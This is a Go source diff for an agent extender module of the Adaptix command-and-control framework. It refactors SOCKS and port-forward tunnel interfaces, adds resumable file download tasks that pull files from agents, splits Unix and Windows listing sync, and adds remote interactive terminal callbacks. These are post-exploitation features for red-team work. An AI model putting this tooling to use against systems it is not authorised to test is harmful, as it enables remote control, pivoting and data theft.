@@ -1,9 +1,11 @@
 package main
 
 import (
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
+	"fmt"
 	"github.com/Adaptix-Framework/axc2"
 	"math/rand"
 	"time"
@@ -45,7 +47,7 @@ type Teamserver interface {
 
 	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
 	TsTaskUpdate(agentId string, data adaptix.TaskData)
-	TsTaskQueueGetAvailable(agentId string, availableSize int) ([]adaptix.TaskData, error)
+	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)
 
 	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
 	TsDownloadUpdate(fileId string, state int, data []byte) error
@@ -58,17 +60,19 @@ type Teamserver interface {
 	TsClientGuiFilesStatus(taskData adaptix.TaskData)
 	TsClientGuiProcess(taskData adaptix.TaskData, jsonFiles string)
 
-	TsTunnelCreateSocks4(AgentId string, Address string, Port int, FuncMsgConnectTCP func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWriteTCP func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
-	TsTunnelCreateSocks5(AgentId string, Address string, Port int, FuncMsgConnectTCP, FuncMsgConnectUDP func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWriteTCP, FuncMsgWriteUDP func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
-	TsTunnelCreateSocks5Auth(AgentId string, Address string, Port int, Username string, Password string, FuncMsgConnectTCP, FuncMsgConnectUDP func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWriteTCP, FuncMsgWriteUDP func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
+	TsTunnelStart(TunnelId string) (string, error)
+	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
+	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
+	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
+	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
+	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)
+
 	TsTunnelStopSocks(AgentId string, Port int)
-	TsTunnelCreateLocalPortFwd(AgentId string, Address string, Port int, FwdAddress string, FwdPort int, FuncMsgConnect func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWrite func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
-	TsTunnelStopLocalPortFwd(AgentId string, Port int)
-	TsTunnelCreateRemotePortFwd(AgentId string, Port int, FwdAddress string, FwdPort int, FuncMsgReverse func(tunnelId int, port int) adaptix.TaskData, FuncMsgWrite func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
-	TsTunnelStateRemotePortFwd(tunnelId int, result bool) (string, string, error)
-	TsTunnelStopRemotePortFwd(AgentId string, Port int)
+	TsTunnelStopLportfwd(AgentId string, Port int)
+	TsTunnelStopRportfwd(AgentId string, Port int)
+
 	TsTunnelConnectionClose(channelId int)
-	TsTunnelConnectionResume(AgentId string, channelId int)
+	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
 	TsTunnelConnectionData(channelId int, data []byte)
 	TsTunnelConnectionAccept(tunnelId int, channelId int)
 }
@@ -137,12 +141,7 @@ func (m *ModuleExtender) AgentCommand(client string, cmdline string, agentData a
 	return nil
 }
 
-func (m *ModuleExtender) AgentPackData(agentData adaptix.AgentData, maxDataSize int) ([]byte, error) {
-	tasks, err := m.ts.TsTaskQueueGetAvailable(agentData.Id, maxDataSize)
-	if err != nil {
-		return nil, err
-	}
-
+func (m *ModuleExtender) AgentPackData(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
 	packedData, err := PackTasks(agentData, tasks)
 	if err != nil {
 		return nil, err
@@ -196,21 +195,6 @@ func (m *ModuleExtender) AgentProcessData(agentData adaptix.AgentData, packedDat
 }
 
 /// BROWSERS
-
-func (m *ModuleExtender) AgentDownloadChangeState(agentData adaptix.AgentData, newState int, fileId string) (adaptix.TaskData, error) {
-	packData, err := BrowserDownloadChangeState(fileId, newState)
-	if err != nil {
-		return adaptix.TaskData{}, err
-	}
-
-	taskData := adaptix.TaskData{
-		Type: TYPE_BROWSER,
-		Data: packData,
-		Sync: false,
-	}
-
-	return taskData, nil
-}
 
 func (m *ModuleExtender) AgentBrowserDisks(agentData adaptix.AgentData) (adaptix.TaskData, error) {
 	packData, err := BrowserDisks(agentData)
@@ -272,20 +256,76 @@ func (m *ModuleExtender) AgentBrowserUpload(path string, content []byte, agentDa
 	return taskData, nil
 }
 
-func (m *ModuleExtender) AgentBrowserDownload(path string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
-	packData, err := BrowserDownload(path, agentData)
+///
+
+func (m *ModuleExtender) AgentTaskDownloadStart(path string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
+
+	r := make([]byte, 4)
+	_, _ = rand.Read(r)
+	taskId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(r))
+
+	packData, err := TaskDownloadStart(path, taskId, agentData)
 	if err != nil {
 		return adaptix.TaskData{}, err
 	}
 
 	taskData := adaptix.TaskData{
-		Type: TYPE_TASK,
-		Data: packData,
-		Sync: true,
+		TaskId: taskId,
+		Type:   TYPE_TASK,
+		Data:   packData,
+		Sync:   true,
 	}
 
 	return taskData, nil
 }
+
+func (m *ModuleExtender) AgentTaskDownloadCancel(fileId string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
+
+	packData, err := TaskDownloadCancel(fileId, agentData)
+	if err != nil {
+		return adaptix.TaskData{}, err
+	}
+
+	taskData := adaptix.TaskData{
+		Type: TYPE_BROWSER,
+		Data: packData,
+		Sync: false,
+	}
+
+	return taskData, nil
+}
+
+func (m *ModuleExtender) AgentTaskDownloadResume(fileId string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
+	packData, err := TaskDownloadResume(fileId, agentData)
+	if err != nil {
+		return adaptix.TaskData{}, err
+	}
+
+	taskData := adaptix.TaskData{
+		Type: TYPE_BROWSER,
+		Data: packData,
+		Sync: false,
+	}
+
+	return taskData, nil
+}
+
+func (m *ModuleExtender) AgentTaskDownloadPause(fileId string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
+	packData, err := TaskDownloadPause(fileId, agentData)
+	if err != nil {
+		return adaptix.TaskData{}, err
+	}
+
+	taskData := adaptix.TaskData{
+		Type: TYPE_BROWSER,
+		Data: packData,
+		Sync: false,
+	}
+
+	return taskData, nil
+}
+
+///
 
 func (m *ModuleExtender) AgentBrowserExit(agentData adaptix.AgentData) (adaptix.TaskData, error) {
 	packData, err := BrowserExit(agentData)
@@ -328,7 +368,16 @@ func SyncBrowserDisks(ts Teamserver, taskData adaptix.TaskData, drivesSlice []ad
 	ts.TsClientGuiDisks(taskData, string(jsonDrives))
 }
 
-func SyncBrowserFiles(ts Teamserver, taskData adaptix.TaskData, path string, filesSlice []adaptix.ListingFileDataUnix) {
+func SyncBrowserFilesUnix(ts Teamserver, taskData adaptix.TaskData, path string, filesSlice []adaptix.ListingFileDataUnix) {
+	jsonDrives, err := json.Marshal(filesSlice)
+	if err != nil {
+		return
+	}
+
+	ts.TsClientGuiFiles(taskData, path, string(jsonDrives))
+}
+
+func SyncBrowserFilesWindows(ts Teamserver, taskData adaptix.TaskData, path string, filesSlice []adaptix.ListingFileDataWin) {
 	jsonDrives, err := json.Marshal(filesSlice)
 	if err != nil {
 		return
@@ -341,7 +390,7 @@ func SyncBrowserFilesStatus(ts Teamserver, taskData adaptix.TaskData) {
 	ts.TsClientGuiFilesStatus(taskData)
 }
 
-func SyncBrowserProcess(ts Teamserver, taskData adaptix.TaskData, processlist []adaptix.ListingProcessDataUnix) {
+func SyncBrowserProcessUnix(ts Teamserver, taskData adaptix.TaskData, processlist []adaptix.ListingProcessDataUnix) {
 	jsonProcess, err := json.Marshal(processlist)
 	if err != nil {
 		return
@@ -350,7 +399,20 @@ func SyncBrowserProcess(ts Teamserver, taskData adaptix.TaskData, processlist []
 	ts.TsClientGuiProcess(taskData, string(jsonProcess))
 }
 
-/// TYPE_TUNNEL
+func SyncBrowserProcessWindows(ts Teamserver, taskData adaptix.TaskData, processlist []adaptix.ListingProcessDataWin) {
+	jsonProcess, err := json.Marshal(processlist)
+	if err != nil {
+		return
+	}
+
+	ts.TsClientGuiProcess(taskData, string(jsonProcess))
+}
+
+/// TUNNEL
+
+func (m *ModuleExtender) AgentTunnelCallbacks() (func(channelId int, address string, port int) adaptix.TaskData, func(channelId int, address string, port int) adaptix.TaskData, func(channelId int, data []byte) adaptix.TaskData, func(channelId int, data []byte) adaptix.TaskData, func(channelId int) adaptix.TaskData, func(tunnelId int, port int) adaptix.TaskData, error) {
+	return TunnelMessageConnectTCP, TunnelMessageConnectUDP, TunnelMessageWriteTCP, TunnelMessageWriteUDP, TunnelMessageClose, TunnelMessageReverse, nil
+}
 
 func TunnelMessageConnectTCP(channelId int, address string, port int) adaptix.TaskData {
 	packData, _ := TunnelCreateTCP(channelId, address, port)
@@ -422,4 +484,54 @@ func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
 	}
 
 	return taskData
+}
+
+/// TERMINAL
+
+func (m *ModuleExtender) AgentTerminalCallbacks() (func(int, string, int, int) (adaptix.TaskData, error), func(int, []byte) (adaptix.TaskData, error), func(int) (adaptix.TaskData, error), error) {
+	return TerminalMessageStart, TerminalMessageWrite, TerminalMessageClose, nil
+}
+
+func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int) (adaptix.TaskData, error) {
+	packData, err := TerminalStart(terminalId, program, sizeH, sizeW)
+	if err != nil {
+		return adaptix.TaskData{}, err
+	}
+
+	taskData := adaptix.TaskData{
+		Type: TYPE_PROXY_DATA,
+		Data: packData,
+		Sync: false,
+	}
+
+	return taskData, nil
+}
+
+func TerminalMessageWrite(channelId int, data []byte) (adaptix.TaskData, error) {
+	packData, err := TerminalWrite(channelId, data)
+	if err != nil {
+		return adaptix.TaskData{}, err
+	}
+	taskData := adaptix.TaskData{
+		Type: TYPE_PROXY_DATA,
+		Data: packData,
+		Sync: false,
+	}
+
+	return taskData, nil
+}
+
+func TerminalMessageClose(terminalId int) (adaptix.TaskData, error) {
+	packData, err := TerminalClose(terminalId)
+	if err != nil {
+		return adaptix.TaskData{}, err
+	}
+
+	taskData := adaptix.TaskData{
+		Type: TYPE_PROXY_DATA,
+		Data: packData,
+		Sync: false,
+	}
+
+	return taskData, nil
 }
